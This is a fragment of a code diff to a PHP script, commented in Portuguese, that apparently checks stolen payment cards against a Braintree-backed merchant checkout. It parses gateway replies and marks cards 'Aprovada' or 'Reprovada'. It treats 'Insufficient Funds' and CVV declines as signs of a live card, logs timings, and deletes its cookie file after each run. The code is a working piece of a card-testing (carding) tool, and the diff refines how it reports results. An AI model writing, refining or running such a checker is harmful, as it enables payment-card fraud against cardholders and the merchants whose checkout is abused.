+            } elseif (stripos($clean_response, 'Do Not Honor') !== false) {
+                $response_message = 'Do Not Honor';
+            } elseif (stripos($clean_response, 'Invalid Card Number') !== false) {
+                $response_message = 'Invalid Card Number';
+            } elseif (stripos($clean_response, 'Expired Card') !== false) {
+                $response_message = 'Expired Card';
+            } elseif (stripos($clean_response, 'success') !== false) {
+                $response_message = 'Aprovada';
                 $is_live = true;
             } else {
-                $gate_response = substr($response, 0, 150);
+                // Mostrar parte da resposta
+                $response_message = substr($clean_response, 0, 80);
+                if (strlen($clean_response) > 80) {
+                    $response_message .= '...';
+                }
             }
         } else {
-            $gate_response = substr($response, 0, 150);
-        }
-    }
-    // Verificar por erros específicos
-    elseif(preg_match('/"message":"(.+?)"/', $response, $matches)) {
-        $gate_response = $matches[1];
-        
-        // VERIFICAÇÕES PARA LIVE (APROVADA)
-        if (strpos($gate_response, 'Card Issuer Declined CVV') !== false) {
-            $is_live = true;
-            $gate_response = 'Card Issuer Declined CVV';
-        }
-        if (strpos($gate_response, 'Insufficient Funds') !== false) {
-            $is_live = true;
-            $gate_response = 'Insufficient Funds';
-        }
-        
-    }
-    // Verificações diretas na resposta
-    elseif(strpos($response, 'Card Issuer Declined CVV') !== false) {
-        $gate_response = 'Card Issuer Declined CVV';
-        $is_live = true; // AGORA É LIVE
-    }
-    elseif(strpos($response, 'Insufficient Funds') !== false) {
-        $gate_response = 'Insufficient Funds';
-        $is_live = true; // AGORA É LIVE
-    }
-    // Outros erros que permanecem como reprovados
-    elseif(strpos($response, 'Processor Declined') !== false) {
-        $gate_response = 'Processor Declined';
-    }
-    elseif(strpos($response, 'Do Not Honor') !== false) {
-        $gate_response = 'Do Not Honor';
-    }
-    // Para respostas de sucesso
-    elseif(strpos($response, 'success') !== false || strpos($response, '"success":true') !== false) {
-        $gate_response = 'success';
-        $is_live = true;
-    }
-    else {
-        // Tentar extrair qualquer texto relevante
-        $gate_response = strip_tags($response);
-        $gate_response = substr($gate_response, 0, 100);
-        if (strlen($gate_response) < 10) {
-            $gate_response = "Resposta não reconhecida";
+            $response_message = 'Resposta vazia';
         }
     }
 } else {
-    $gate_response = "Falha na requisição ou resposta vazia | HTTP: $http_code";
+    $response_message = 'Falha na conexão';
+    if ($payment_http) {
+        $response_message .= ' (HTTP ' . $payment_http . ')';
+    }
 }
 
-// Adicionar informações de tempo ao resultado
-$time_info = "⏱️ Total: {$total_execution_time}ms (Braintree: {$braintree_time}ms | Site: {$site_time}ms)";
+// Limpar resposta para exibição
+$response_message = htmlspecialchars($response_message);
+$response_message = trim($response_message);
 
-// Determinar status final
-if($is_live) {
-    cyber("💸", "Aprovada", $lista, "[ $gate_response ] - $time_info");
+// Se resposta muito longa, truncar
+if (strlen($response_message) > 100) {
+    $response_message = substr($response_message, 0, 100) . '...';
+}
+
+// Formatar tempo em segundos
+$time_info = "⏱️ Total: {$total_time}s (Init: {$init_time_total}s | Braintree: {$braintree_time_total}s | Payment: {$payment_time_total}s)";
+
+// Exibir resultado
+if ($is_live) {
+    cyber("💸", "Aprovada", $lista, "[ {$response_message} ] - {$time_info}");
 } else {
-    cyber("❌", "Reprovada", $lista, "[ $gate_response ] - $time_info", "#ff3366", "#ff3366");
+    cyber("❌", "Reprovada", $lista, "[ {$response_message} ] - {$time_info}", "#ff3366", "#ff3366");
 }
 
-// Limpar arquivo de cookies após uso
-if (file_exists('cookies.txt')) {
-    unlink('cookies.txt');
+// Limpar arquivo de cookies
+if (file_exists($cookie_file)) {
+    unlink($cookie_file);
 }
+
+exit();
 ?>
